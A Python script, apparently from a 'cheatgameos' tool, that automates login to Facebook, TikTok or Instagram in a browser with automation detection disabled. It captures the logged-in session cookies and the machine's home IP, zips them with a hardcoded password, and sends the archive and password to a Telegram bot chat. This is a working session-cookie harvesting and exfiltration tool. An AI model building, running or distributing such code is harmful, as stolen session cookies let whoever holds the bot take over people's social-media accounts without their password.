# -*- coding: utf-8 -*-
"""agent.py — Chạy local để lấy cookie bằng IP nhà."""

import asyncio
import io
import json
import requests
import pyzipper
from datetime import datetime
from playwright.async_api import async_playwright

# ==================== ĐIỀN VÀO ĐÂY ====================
BOT_TOKEN   = "ĐIỀN_TOKEN_TELEGRAM"
CHAT_ID     = 0
SITE        = "facebook"
ZIP_PASSWORD = "cheatgame"
# ====================================================

SITES = {
    "facebook": {
        "url": "https://www.facebook.com/login",
        "user_sel": 'input[name="email"]',
        "pass_sel": 'input[name="pass"]',
        "submit_sel": 'button[name="login"]',
    },
    "tiktok": {
        "url": "https://www.tiktok.com/login/phone-or-email/email",
        "user_sel": 'input[name="username"]',
        "pass_sel": 'input[type="password"]',
        "submit_sel": 'button[type="submit"]',
    },
    "instagram": {
        "url": "https://www.instagram.com/accounts/login/",
        "user_sel": 'input[name="username"]',
        "pass_sel": 'input[name="password"]',
        "submit_sel": 'button[type="submit"]',
    },
}


async def main():
    print("🍪 CHEATGAMEOS AGENT (IP NHÀ)")
    cfg = SITES[SITE]
    username = input("👤 Tài khoản: ").strip()
    password = input("🔑 Mật khẩu: ")

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=["--disable-blink-features=AutomationControlled"]
        )
        ctx = await browser.new_context(
            viewport={"width": 1366, "height": 768},
            locale="vi-VN",
        )
        page = await ctx.new_page()

        await page.goto("https://api.ipify.org?format=json")
        my_ip = json.loads(await page.inner_text("body")).get("ip")
        print(f"🏠 IP nhà: {my_ip}")

        await page.goto(cfg["url"], wait_until="domcontentloaded")
        await page.wait_for_timeout(2000)
        await page.fill(cfg["user_sel"], username)
        await page.fill(cfg["pass_sel"], password)
        await page.click(cfg["submit_sel"])
        print("⏳ Đợi login 10s...")
        await page.wait_for_timeout(10000)

        if "login" in page.url.lower():
            print("⚠️ Login chưa xong. Đăng nhập thủ công.")
            input("Enter sau khi login...")

        cookies = await ctx.cookies()
        await browser.close()

    if not cookies:
        print("❌ Không có cookie.")
        return

    buf = io.BytesIO()
    data = json.dumps({
        "meta": {"site": SITE, "ip": my_ip,
                 "extracted_at": datetime.now().isoformat(),
                 "total": len(cookies), "tool": "cheatgameos-agent"},
        "cookies": cookies,
    }, ensure_ascii=False, indent=2).encode("utf-8")

    with pyzipper.AESZipFile(buf, "w",
            compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ZIP_PASSWORD.encode())
        zf.writestr(f"cookie_{SITE}.json", data)

    zip_bytes = buf.getvalue()
    fname = f"agent_{SITE}_{int(datetime.now().timestamp())}.zip"

    files = {"document": (fname, zip_bytes, "application/zip")}
    payload = {
        "chat_id": CHAT_ID,
        "caption": (f"✅ *Cookie từ Agent Local*\n"
                    f"🌐 Site: `{SITE}`\n"
                    f"🏠 IP nhà: `{my_ip}`\n"
                    f"🍪 Cookie: `{len(cookies)}`\n"
                    f"🔑 ZIP pass: `{ZIP_PASSWORD}`"),
        "parse_mode": "Markdown",
    }
    r = requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
        data=payload, files=files, timeout=60
    ).json()

    if r.get("ok"):
        print("🎉 Gửi thành công!")
    else:
        print(f"❌ Lỗi: {r}")
        with open(fname, "wb") as f:
            f.write(zip_bytes)
        print(f"💾 Lưu local: {fname}")


if __name__ == "__main__":
    asyncio.run(main())
